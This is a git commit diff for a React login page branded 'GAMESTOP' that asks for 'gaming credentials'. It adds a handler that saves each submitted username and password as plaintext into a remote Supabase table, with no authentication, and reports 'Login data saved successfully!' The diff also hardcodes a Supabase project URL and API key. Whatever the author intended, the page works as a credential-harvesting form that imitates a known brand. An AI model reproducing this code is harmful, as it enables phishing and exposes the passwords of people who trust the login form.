d907ce563c2d94eb91f42e8555dbf3d5cc995ef9
Harshal <harshaldeorukhakar@gmail.com>
2026-06-22 14:58:37 +0530

    h1

--- src/pages/Login.jsx
+++ src/pages/Login.jsx
@@ -1,27 +1,88 @@
+import { useState } from "react";
+import { supabase } from "./supabase";
+
 function Login() {
+  const [username, setUsername] = useState("");
+  const [password, setPassword] = useState("");
+  const [message, setMessage] = useState("");
+
+  const handleLogin = async (e) => {
+    e.preventDefault();
+
+    if (!username || !password) {
+      setMessage("Please enter Username and Password");
+      return;
+    }
+
+    const { data, error } = await supabase
+  .from("login")
+  .insert([
+    {
+      Username: username,
+      Password: password,
+    },
+  ])
+  .select();
+
+console.log("DATA:", data);
+console.log("ERROR:", error);
+
+    if (error) {
+      console.log(error);
+      setMessage("Failed to save data");
+      return;
+    }
+
+    setMessage("Login data saved successfully!");
+
+    setUsername("");
+    setPassword("");
+  };
+
   return (
     <div className="login-page">
+      <div className="login-container">
+        <h1>GAMESTOP</h1>
 
-      <h1>Login To GameStop</h1>
+        <p className="login-subtitle">
+          Enter your gaming credentials
+        </p>
 
-      <form className="login-form">
+        <form onSubmit={handleLogin}>
+          <input
+            type="text"
+            placeholder="Username"
+            value={username}
+            onChange={(e) =>
+              setUsername(e.target.value)
+            }
+          />
 
-        <input
-          type="email"
-          placeholder="Email Address"
-        />
+          <input
+            type="password"
+            placeholder="Password"
+            value={password}
+            onChange={(e) =>
+              setPassword(e.target.value)
+            }
+          />
 
-        <input
-          type="password"
-          placeholder="Password"
-        />
+          <button type="submit">
+            Login
+          </button>
+        </form>
 
-        <button>
-          Login
-        </button>
-
-      </form>
-
+        {message && (
+          <p
+            style={{
+              marginTop: "15px",
+              color: "#00ffff",
+            }}
+          >
+            {message}
+          </p>
+        )}
+      </div>
     </div>
   );
 }
---
+++ src/pages/supabase.js
@@ -0,0 +1,2 @@
+import { createClient } from "@supabase/supabase-js";
+export const supabase = createClient("https://ufckgogylrnmxkexveum.supabase.co","eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InVmY2tnb2d5bHJubXhrZXh2ZXVtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODA5OTA2ODksImV4cCI6MjA5NjU2NjY4OX0.ylm3i9pQbbus0zui-UisnYPvM-XIkfm4DSOlgsG5X5E");
